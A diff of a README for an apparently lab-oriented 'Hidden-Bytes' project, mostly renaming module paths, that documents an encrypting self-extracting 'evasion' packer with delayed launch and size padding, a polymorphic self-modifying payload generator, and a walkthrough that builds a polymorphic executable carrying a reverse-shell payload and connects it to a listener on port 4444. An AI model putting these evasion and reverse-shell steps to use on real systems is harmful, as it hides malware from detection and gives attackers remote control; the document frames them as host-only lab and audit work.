@@ -165,15 +165,15 @@ The original subject discusses binary manipulation, encryption, file-size change
 
 ```text
 Hidden-Bytes/
-├── hidden_bytes/
+├── src/
 │   ├── __init__.py
-│   ├── embedding.py         # shared PyInstaller / AES-source helpers
+│   ├── common.py          # shared utilities (KDF, passphrase, args)
+│   ├── embedding.py       # shared PyInstaller / AES-source helpers
 │   ├── evasion/             # HBX1 packaging tool (package)
 │   │   ├── __init__.py      # public API re-exports
-│   │   ├── __main__.py      # enables `python -m hidden_bytes.evasion`
+│   │   ├── __main__.py      # enables `python -m src.evasion`
 │   │   ├── constants.py
 │   │   ├── encoding.py
-│   │   ├── args.py
 │   │   ├── container.py
 │   │   ├── crypto.py
 │   │   ├── pure_aes.py      # dependency-free AES-256-GCM, spliced into artifacts
@@ -198,7 +198,7 @@ Hidden-Bytes/
 ```
 
 The precise test filenames may differ in your checkout. Run every command below
-from the **project root** so that the `hidden_bytes` package is importable.
+from the **project root** so that the `src` package is importable.
 
 ### Windows PowerShell
 
@@ -207,8 +207,8 @@ py -m venv .venv
 .venv\Scripts\Activate.ps1
 py -m pip install -r requirements-dev.txt
 
-py -m hidden_bytes.evasion --help
-py -m hidden_bytes.polymorphic --help
+py -m src.evasion --help
+py -m src.polymorphic --help
 ```
 
 If PowerShell blocks virtual-environment activation due to local policy, use the Python executable in `.venv\Scripts\python.exe` directly rather than changing a system-wide execution policy just for this project.
@@ -220,8 +220,8 @@ python3 -m venv .venv
 source .venv/bin/activate
 python3 -m pip install -r requirements-dev.txt
 
-python3 -m hidden_bytes.evasion --help
-python3 -m hidden_bytes.polymorphic --help
+python3 -m src.evasion --help
+python3 -m src.polymorphic --help
 ```
 
 If the repository includes executable wrapper scripts, they may also be used:
@@ -334,7 +334,7 @@ The last row is the point worth making to the auditor: **the reverse shell is wh
 
 ### 4.1 What the tool does
 
-`hidden_bytes.evasion` has three modes:
+`src.evasion` has three modes:
 
 - `--encrypt`: reads a file as bytes, encrypts it using AES-256-GCM, and writes the result in one of two shapes:
   - `--mode runner` (default): a **self-extracting runner**. One file that contains the launcher and the encrypted container. Running it waits for the recorded delay, decrypts the payload, writes it to a temporary directory, launches it, and removes the temporary directory.
@@ -374,7 +374,7 @@ Two details make this work in practice:
 Display help:
 
 ```bash
-python3 -m hidden_bytes.evasion --help
+python3 -m src.evasion --help
 ```
 
 The module expects exactly one mode (`--encrypt`, `--decrypt`, or `--inspect`) and a positional input path called `source`.
@@ -421,7 +421,7 @@ wc -c sample.txt
 ```bash
 export HBX_PASSPHRASE='lab-passphrase'
 
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --encrypt sample.txt \
   --output sample.hbx \
   --add-size 1 \
@@ -456,7 +456,7 @@ The exact key path depends on where the repository is located. `--add-size 1` re
 #### Step 3 — Inspect the container
 
 ```bash
-python3 -m hidden_bytes.evasion --inspect sample.hbx
+python3 -m src.evasion --inspect sample.hbx
 ```
 
 The command prints metadata similar to:
@@ -481,7 +481,7 @@ The nonce changes between encryption runs, so the example nonce above is a place
 #### Step 4 — Recover the original file
 
 ```bash
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --decrypt sample.hbx \
   --output recovered.txt \
   --key sample.hbx.key
@@ -499,7 +499,7 @@ Expected behavior for a container created with `--delay 2`:
 For a quick test that skips the configured wait:
 
 ```bash
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --decrypt sample.hbx \
   --output recovered-no-delay.txt \
   --key sample.hbx.key \
@@ -552,7 +552,7 @@ EOF
 ```bash
 export HBX_PASSPHRASE='lab-passphrase'
 
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --encrypt simple_program.py \
   --output obfuscated.pyz \
   --add-size 101 \
@@ -595,7 +595,7 @@ Hello, World!
 #### Step 4 — Inspect the runner without decrypting it
 
 ```bash
-python3 -m hidden_bytes.evasion --inspect obfuscated.pyz
+python3 -m src.evasion --inspect obfuscated.pyz
 ```
 
 ```json
@@ -628,7 +628,7 @@ The payload does not appear as plaintext in the artifact: it is AES-256-GCM ciph
 #### Step 6 — Recover the payload from a runner without running it
 
 ```bash
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --decrypt obfuscated.pyz \
   --output recovered.py \
   --no-delay
@@ -648,7 +648,7 @@ python -m pip install pyinstaller
 Then build the executable:
 
 ```bash
-python -m hidden_bytes.evasion \
+python -m src.evasion \
   --encrypt simple_program.exe \
   --output evaded_program.exe \
   --add-size 101 \
@@ -685,13 +685,13 @@ This reports the real file type, the PE structure, the section entropy and the s
 Inspect the CLI options:
 
 ```bash
-python3 -m hidden_bytes.evasion --help
+python3 -m src.evasion --help
 ```
 
 Create a second container with a different delay and size increase:
 
 ```bash
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --encrypt sample.txt \
   --output sample-small.hbx \
   --add-size 0.1 \
@@ -702,13 +702,13 @@ python3 -m hidden_bytes.evasion \
 Inspect it:
 
 ```bash
-python3 -m hidden_bytes.evasion --inspect sample-small.hbx
+python3 -m src.evasion --inspect sample-small.hbx
 ```
 
 Recover it without waiting (for a quick test):
 
 ```bash
-python3 -m hidden_bytes.evasion \
+python3 -m src.evasion \
   --decrypt sample-small.hbx \
   --output recovered-small.txt \
   --key sample-small.hbx.key \
@@ -841,7 +841,7 @@ flowchart TD
 
 ### 5.1 What it does
 
-`hidden_bytes.polymorphic` generates a **self-modifying program** that carries an encrypted payload inside itself.
+`src.polymorphic` generates a **self-modifying program** that carries an encrypted payload inside itself.
 
 The generated program, when it runs:
 
@@ -856,7 +856,7 @@ The payload is supplied by the operator as a file. The generated program has no 
 PowerShell:
 
 ```powershell
-py -m hidden_bytes.polymorphic `
+py -m src.polymorphic `
   --generate polymorphic_demo.py `
   --payload message.py `
   --passphrase "lab-passphrase"
@@ -865,7 +865,7 @@ py -m hidden_bytes.polymorphic `
 Linux/macOS:
 
 ```bash
-python3 -m hidden_bytes.polymorphic \
+python3 -m src.polymorphic \
   --generate polymorphic_demo.py \
   --payload message.py \
   --passphrase "lab-passphrase"
@@ -921,12 +921,12 @@ The generated file must be writable for the self-modification step. If it is rea
 ### 5.4 Generate two variants and compare them
 
 ```bash
-python3 -m hidden_bytes.polymorphic \
+python3 -m src.polymorphic \
   --generate variant_a.py \
   --payload message.py \
   --passphrase "lab-passphrase"
 
-python3 -m hidden_bytes.polymorphic \
+python3 -m src.polymorphic \
   --generate variant_b.py \
   --payload message.py \
   --passphrase "lab-passphrase"
@@ -974,7 +974,7 @@ Build the polymorphic program with the reverse shell payload:
 ```bash
 export HBX_PASSPHRASE='lab-passphrase'
 
-python3 -m hidden_bytes.polymorphic \
+python3 -m src.polymorphic \
   --generate polymorphic.exe \
   --payload lab/reverse_shell_payload.py
 ```
@@ -1017,7 +1017,7 @@ On Windows the audit expects a `.exe`. **An output path ending in `.exe` is pack
 
 ```bash
 python -m pip install pyinstaller
-python3 -m hidden_bytes.polymorphic \
+python3 -m src.polymorphic \
   --generate polymorphic.exe \
   --payload lab/reverse_shell_payload.py
 ```
@@ -1121,7 +1121,7 @@ Use harmless text samples first. These commands are intended to make the behavio
 
 1. Confirm the lab network adapter is in **Host-Only** mode and note the address the listener will use.
 2. Start the listener in one terminal: `python3 lab/listener.py --port 4444`.
-3. Generate the polymorphic program with the reverse shell payload: `python3 -m hidden_bytes.polymorphic --generate polymorphic.exe --payload lab/reverse_shell_payload.py`.
+3. Generate the polymorphic program with the reverse shell payload: `python3 -m src.polymorphic --generate polymorphic.exe --payload lab/reverse_shell_payload.py`.
 4. Run it with the listener's address: `python3 polymorphic.exe --host <host-only-address> --port 4444`.
 5. Confirm the listener reports the connection and its peer address.
 6. Type `whoami` and `hostname` in the listener terminal; confirm the remote shell answers.
